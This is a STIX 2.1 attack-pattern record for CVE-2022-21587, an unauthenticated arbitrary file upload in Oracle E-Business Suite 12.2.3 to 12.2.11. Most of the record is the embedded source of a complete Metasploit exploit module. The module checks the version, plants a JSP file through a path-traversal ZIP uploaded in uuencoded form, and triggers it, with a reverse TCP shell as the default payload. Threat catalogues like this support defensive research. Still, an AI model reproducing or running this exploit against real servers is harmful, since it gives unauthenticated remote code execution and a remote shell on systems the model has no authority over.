{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--840779a0-fab9-4702-9791-00f3ec630ef7",
    "created": "2024-08-14T17:02:21.901759Z",
    "modified": "2024-08-14T17:02:21.901763Z",
    "name": "Oracle E-Business Suite (EBS) Unauthenticated Arbitrary File Upload",
    "description": " This module exploits an unauthenticated arbitrary file upload vulnerability in Oracle Web Applications Desktop Integrator, as shipped with Oracle EBS versions 12.2.3 through to 12.2.11, in order to gain remote code execution as the oracle user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/oracle_ebs_rce_cve_2022_21587.rb",
            "external_id": "oracle_ebs_rce_cve_2022_21587.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-21587"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/Bkij5kK1qK/cve-2022-21587/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/hieuminhnv/CVE-2022-21587-POC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Oracle E-Business Suite (EBS) Unauthenticated Arbitrary File Upload',\n        'Description' => %q{\n          This module exploits an unauthenticated arbitrary file upload vulnerability in Oracle Web Applications\n          Desktop Integrator, as shipped with Oracle EBS versions 12.2.3 through to 12.2.11, in\n          order to gain remote code execution as the oracle user.\n        },\n        'Author' => [\n          'sf', # MSF Exploit & Rapid7 Analysis\n          'HMs', # Python PoC\n          'l1k3beef', # Original Discoverer\n        ],\n        'References' => [\n          ['CVE', '2022-21587'],\n          ['URL', 'https://attackerkb.com/topics/Bkij5kK1qK/cve-2022-21587/rapid7-analysis'],\n          ['URL', 'https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/'],\n          ['URL', 'https://github.com/hieuminhnv/CVE-2022-21587-POC']\n        ],\n        'DisclosureDate' => '2022-10-01',\n        'License' => MSF_LICENSE,\n        'Platform' => %w[linux],\n        'Arch' => ARCH_JAVA,\n        'Privileged' => false, # Code execution as user 'oracle'\n        'Targets' => [\n          [\n            'Oracle EBS on Linux (OVA Install)',\n            {\n              'Platform' => 'linux',\n              'EBSBasePath' => '/u01/install/APPS/fs1/',\n              'EBSUploadPath' => 'EBSapps/appl/bne/12.0.0/upload/',\n              'EBSFormsPath' => 'FMW_Home/Oracle_EBS-app1/applications/forms/forms/'\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'java/jsp_shell_reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8000)\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/OA_HTML/FrmReportData'\n    )\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    return CheckCode::Unknown unless res.code == 200\n\n    match = res.body.match(%r{jsLibs/Common(\\d+_\\d+_\\d+)})\n\n    if match && (match.length == 2)\n      version = Rex::Version.new(match[1].gsub('_', '.'))\n\n      if version.between?(Rex::Version.new('12.2.3'), Rex::Version.new('12.2.11'))\n        return CheckCode::Appears(\"Oracle EBS version #{version} detected.\")\n      end\n\n      return CheckCode::Safe(\"Oracle EBS version #{version} detected.\")\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    endpoints = %w[BneViewerXMLService BneDownloadService BneOfflineLOVService BneUploaderService]\n\n    target_url = \"/OA_HTML/#{endpoints.sample}\"\n\n    print_status(\"Targeting the endpoint: #{target_url}\")\n\n    jsp_name = Rex::Text.rand_text_alpha_lower(3..8) + '.jsp'\n\n    jsp_path = '../' * target['EBSUploadPath'].split('/').length\n\n    jsp_path << \"#{target['EBSFormsPath']}#{jsp_name}\"\n\n    jsp_absolute_path = \"#{target['EBSBasePath']}#{target['EBSFormsPath']}#{jsp_name}\"\n\n    zip = Rex::Zip::Archive.new\n    zip.add_file(jsp_path, payload.encoded)\n\n    # The ZIP file is expected to be encoded with the binary to text encoding mechanism called uuencode.\n    # For a detailed description refer to the Rapid7 AttackerKB analysis in the References section of this module.\n    uue_data = \"begin 777 #{Rex::Text.rand_text_alpha_lower(3..8)}.zip\\n\"\n    uue_data << [zip.pack].pack('u')\n    uue_data << \"end\\n\"\n\n    uue_name = \"#{Rex::Text.rand_text_alpha_lower(3..8)}.uue\"\n\n    mime = Rex::MIME::Message.new\n    mime.add_part(uue_data, 'text/plain', nil, %(form-data; name=\"file\"; filename=\"#{uue_name}\"))\n\n    register_file_for_cleanup(jsp_absolute_path)\n\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => target_url,\n        'vars_get' => { 'bne:uueupload' => 'true' },\n        'encode_params' => true,\n        'ctype' => \"multipart/form-data; boundary=#{mime.bound}\",\n        'data' => mime.to_s\n      }\n    )\n\n    unless res && res.code == 200 && res.body.include?('bne:text=\"Cannot be logged in as GUEST.\"')\n      fail_with(Failure::UnexpectedReply, 'Failed to upload the payload')\n    end\n\n    print_status('Triggering the payload...')\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => \"/forms/#{jsp_name}\"\n    )\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2022-10-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}